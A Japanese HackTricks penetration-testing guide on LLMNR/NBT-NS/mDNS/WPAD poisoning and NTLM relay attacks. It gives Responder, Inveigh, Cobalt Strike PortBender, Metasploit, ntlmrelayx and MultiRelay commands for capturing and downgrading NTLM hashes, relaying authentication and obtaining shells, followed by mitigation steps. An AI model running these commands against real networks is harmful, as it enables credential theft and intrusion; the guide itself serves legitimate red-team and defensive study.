# LLMNR、NBT-NS、mDNS/DNSおよびWPADのスプーフィングとリレーアタック

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## ネットワークプロトコル

### LLMNR、NBT-NS、およびmDNS

Microsoftシステムは、DNSルックアップが失敗した場合にローカルホスト解決のためにLink-Local Multicast Name Resolution（LLMNR）とNetBIOS Name Service（NBT-NS）を使用します。Apple BonjourとLinuxのゼロコンフィギュレーション実装は、ネットワーク内のシステムを発見するためにMulticast DNS（mDNS）を使用します。これらのプロトコルは認証されておらず、UDP経由でメッセージをブロードキャストするため、攻撃者はそれらを悪用してユーザーを悪意のあるサービスに誘導することができます。

Responderを使用して、ホストが検索するサービスを偽装し、偽の応答を送信することができます。\
[Responderでサービスを偽装する方法](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)についての詳細はこちらを読んでください。

### WPAD

多くのブラウザは、ネットワークからプロキシ設定を読み込むためにWeb Proxy Auto-Discovery（WPAD）を使用します。WPADサーバーは、以下のいずれかを通じて識別された場合に、特定のURL（例：_http://wpad.example.org/wpad.dat_）を介してクライアントプロキシ設定を提供します：

* DHCPを使用し、コード252エントリ[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)を使用する
* ローカルドメインで_wpad_ホスト名を検索するDNS
* DNSルックアップが失敗した場合のMicrosoft LLMNRおよびNBT-NS

ResponderはWPAD攻撃を自動化します—プロキシを実行し、DHCP、DNS、LLMNR、およびNBT-NSを介してクライアントを悪意のあるWPADサーバーに誘導します。

## プロトコルポイズニング

### Responder - LLMNR、NBT-NSおよびMDNS

> ResponderはLLMNR、NBT-NSおよびMDNSのポイズナーです。これは、名前のサフィックスに基づいて特定のNBT-NS（NetBIOS Name Service）クエリに応答します（参照：[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)）。デフォルトでは、ツールはSMB用のFile Server Serviceリクエストにのみ応答します。
>
> これの背後にあるコンセプトは、私たちの回答をターゲットにし、ネットワーク上でよりステルスにすることです。これはまた、正当なNBT-NSの動作を壊さないようにするのにも役立ちます。

* [**Responder**](https://github.com/lgandx/Responder)はデフォルトでkaliにインストールされており、設定ファイルは\*\*`/etc/responder/Responder.conf` \*\*にあります（ここでローグサーバーを無効にできます）
* **Responder**は画面に**ハッシュを表示し**、`/usr/share/responder/logs`ディレクトリにあるホストごとの**ログ**ファイルに**書き込みます**。ハッシュは`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`の形式で保存されます
* こちらで**windows**用のResponderを見つけることができます[こちら](https://github.com/lgandx/Responder-Windows)
* Responderは**ipv4**および**ipv6**で動作します

#### Responderのパラメータ

Responderは以下のオプションをサポートしています：
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder Params</summary>

* `-A` フラグは**分析モード**に入り、環境内のNBT-NS、BROWSER、LLMNRリクエストを見ることができますが、レスポンスを汚染しません。
* インターフェースまたはIPのどちらかを必ず指定する必要があります。
* `-wf` はWPADローグプロキシサーバーを起動します。
* `-f` はリモートホストのオペレーティングシステムとバージョンを指紋認証しようとします。
* `-v` フラグを使用して詳細度を上げます（コンソールに多くの追加データが表示されます）。
* `-F` や `-P` のようなオプションはNTLMまたはBasic認証を強制し、プロキシ認証を強制することができますが、ログインプロンプトが表示される可能性があるため、控えめに使用するべきです。
* `-w` フラグは組み込みのWPADプロキシサーバーを利用します。これは特に大規模な組織で非常に効果的であり、[自動検出設定](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)が有効になっているInternet Explorerを起動するユーザーのすべてのHTTPリクエストをキャプチャします。

</details>

#### Responderの実行

デフォルトのResponder動作を実行するには、次のコマンドを実行します。
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
面白いテクニックは、可能な場合にNTLM認証をダウングレードするためにresponderを使用することです。これにより、**簡単にクラックできる**NTLMv2の代わりに**NTLMv1のチャレンジとレスポンスをキャプチャする**ことができます[**このガイドに従って**](../../windows-hardening/ntlm/#ntlmv1-attack)**。**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
**デフォルト**では、**WPADのなりすましは実行されませんが**、以下の操作で実行できます:
```bash
responder -I <Iface> --wpad
```
NetBIOSリクエストを**あなたのIP**で解決することもできます。そして、**認証プロキシ**を作成します：
```bash
responder.py -I <interface> -Pv
```
```markdown
NTLMハッシュを傍受することは通常できませんが、**NTLMチャレンジとレスポンス**を簡単に取得し、例えば_**john**_のオプション`--format=netntlmv2`を使用して**クラック**することができます。

デフォルトの_**Responder**_インストールの**ログとチャレンジ**は、kaliでは`/usr/share/responder/logs`で見つけることができます。

#### Responder - DHCPポイズニング

WindowsはNetBIOS、WINS、WPAD設定など、いくつかのカスタムDHCPオプションを使用します。ワークステーションがDHCPリクエストを送信してネットワーク設定を取得する際、これらの追加設定はDHCP応答に含まれ、簡単な接続と名前解決を促進します。

ワークステーションのネットワーク構成に干渉するため、DHCP応答をスプーフィングすることは難しい場合があります。通常、ターゲットサブネット、DNSサーバーの位置、スイッチ、ルーティングテーブル、ドメイン、ネットマスク、DHCPサーバーなどについて非常に良い知識を持っている必要があります。**これらの設定で間違いがあると、ネットワークに障害が発生します。**

しかし、DHCP応答をスプーフィングすることにはユニークな利点があります。**ARPポイズニングよりも確実にステルス性が高いです**。一つのユニキャスト応答で被害者のルーティング情報を永続的に汚染することができ、また、複数のDHCPサーバーがネットワーク上で動作しているのを見ることが一般的です。ユニキャストDHCP応答は検出がより複雑で、いくつかのスイッチはDHCPスヌーピングを防ぐためのセキュリティ設定を提供していますが、これらの設定は直感的ではなく、有効にされたときにしばしば誤設定されています。

> この攻撃は非常に効果的で、確実にNTLMv1/2ハッシュを取得できます。
```
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - 資格情報のキャプチャ

Responderは**言及されたプロトコルを使用するすべてのサービスを偽装します**。ユーザーがこれらのプロトコルを使用して解決されるサービスにアクセスしようとすると、**Responderに対して認証を試みます**が、Responderは"資格情報"（おそらく**NTLMv2チャレンジ/レスポンス**）を**キャプチャ**することができます：

NetNTLMv1にダウングレードを試みるか、ESSを無効にすることも可能です。

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighは、Windowsシステムに限定されているペネトレーションテスター/レッドチームの支援を目的としたPowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSスプーフィングおよびマン・イン・ザ・ミドルツールです。

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)はPowerShellスクリプトでしたが、現在はResponderと同じ主要機能を持つC#バイナリです。すべてのパラメータと使用方法をリストした[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)があります。\
別のバージョンは[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)で見つけることができます。

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

または、より多くのオプションで実行します：
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
または、C#バージョンを実行します：
```bash
Inveigh.exe
```
## NTLMリレー攻撃

この攻撃は、内部ネットワーク上の**SMB認証セッション**を**ターゲットマシン**にリレーします。認証**セッションが成功する**と、自動的に**システム** **シェル**に入ります。リレーされた認証は、リレーされたホストに対してローカル管理者アクセス権を持つ**ユーザーからのものである必要があり**、**SMB署名が無効になっている必要があります**。

### 445の転送とトンネリング

{% hint style="warning" %}
ネットワーク内にマシンを**導入できる**場合は、次のセクションの**ツール**を使用してリレー攻撃を実行でき、これについて心配する必要はありません。
{% endhint %}

しかし、レッドチームではそうではありません。レッドチームでは通常、以下のツールのいずれかを実行しているマシンにWindowsマシンのポート445のトラフィックを**転送し**、そのツールのトラフィックをプロキシを通じて内部の攻撃対象マシンに**ルーティングする必要があります**。

ツール[**PortBender**](https://github.com/praetorian-inc/PortBender)は、ポート**445のトラフィックを別のポート**（例：8445）に**リダイレクト**するドライバーです。ドライバーをロードするためには**ローカル管理者**アクセスが必要です。ほとんどのWindowsドライバーが配置されている`C:\Windows\System32\drivers`に移動するのが理にかなっています。
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

**MultiRelay**を使用する場合、_**/usr/share/responder/tools**_ に移動し、MultiRelayを実行します（`-t <IP target> -u <User>`）：
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### NTLMログインの強制

Windowsでは、**特権アカウントを任意のマシンに認証させることができる場合があります**。以下のページを読んで、方法を学びましょう：

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## 解決策

### LLMNRの無効化

ドメイン内のDNSクライアントでLLMNRを無効にするには、gpedit.mscを開きます。\
コンピューターの構成->管理用テンプレート->ネットワーク->DNSクライアントに移動します。\
「マルチキャスト名前解決をオフにする」オプションを探し、「ポリシー設定」をクリックします：

![](../../.gitbook/assets/1.jpg)

新しいウィンドウが開いたら、このオプションを有効にし、「適用」を押してから「OK」をクリックします：

![](../../.gitbook/assets/2.jpg)

### **NBT-NSの無効化**

NBT-NSを無効にする一つの方法は、DHCPスコープオプションを使用することです。

MicrosoftのDHCPサーバーを使用している場合、NBT-NSを無効にしたいスコープを選択します。右クリックして「スコープオプション」を選び、「オプションの設定」をクリックします。以下の例では、NBT-NSを無効にしたいDHCPスコープは192.168.1.100です。

![](../../.gitbook/assets/3.jpg)

スコープオプションウィンドウで、詳細タブに移動し、ドロップダウンウィンドウを「Microsoft Windows 2000オプション」に変更します：

![](../../.gitbook/assets/4.jpg)

リストから「001 Microsoft Disable Netbios Option」を選択し、その値を「0x2」に変更し、「適用」を押してから「OK」をクリックします：

![](../../.gitbook/assets/5.jpg)

### WPAD

WPAD攻撃に対処するには、DNSゾーンに「wpad」というエントリを追加します。DNSエントリは有効なWPADサーバーを指している必要はありません。クエリが解決されれば、攻撃は防げます。

### マルチリレー

1\. **すべてのローカルWindowsマシンでSMB署名を強制する**。この設定は、すべてのSMBセッションにデジタル署名を施し、クライアントとサーバーがパケットの出所を確認してから続行することを強制します。この設定はデフォルトでドメインコントローラーにのみ有効です。以下のMicrosoftの記事には、これらの設定（グループポリシーを通じて有効にできる）と、それらを実装する方法が詳しく記載されています。

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **ローカルネットワーク上のユーザーが必要なマシンにのみリモートログインできるように確認する**。例えば、SallyはSallyのワークステーションにのみログインできます。攻撃者がSallyのSMB認証セッションを傍受した場合でも、セッションを他のワークステーションにリレーすることはできないため、この方法は無効になります。

3\. **可能な限りローカルネットワークでのNTLM認証を制限する**。この攻撃はKerberos認証を利用できないため、発生するNTLMの量を制限することで、この攻撃を大幅に阻止できます。Microsoftからこの実現方法に関する情報がありますが、注意が必要です。Kerberos認証が何らかの理由で失敗すると、通常はNTLMにフォールバックします。完全に無効にすると、ネットワークが停止する可能性があります。

4\. **ネットワーク上の不正ユーザーを防ぐ**。内部の脅威は、すでにネットワーク資格情報を持っているため、SMBリレー攻撃を使用することはありません。物理セキュリティポリシーを強化し、ACLやMACフィルタリングでネットワーク上の不正なデバイスを防ぎ、適切なネットワークセグメンテーションを確保することで、この攻撃が実行される脅威を大幅に制限できます。

## 参考文献

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **画像出典：**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
